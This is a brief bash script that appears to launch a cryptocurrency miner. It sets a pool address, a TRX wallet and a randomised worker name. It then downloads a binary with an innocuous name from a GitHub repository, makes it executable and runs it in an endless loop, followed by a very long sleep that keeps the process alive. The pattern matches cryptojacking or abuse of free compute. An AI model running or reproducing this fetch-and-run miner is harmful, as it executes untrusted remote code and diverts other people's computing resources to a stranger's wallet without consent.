#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETCHASH --pool $POOL --user $WALLET.$WORKER
sleep 5
done
sleep 999999999 
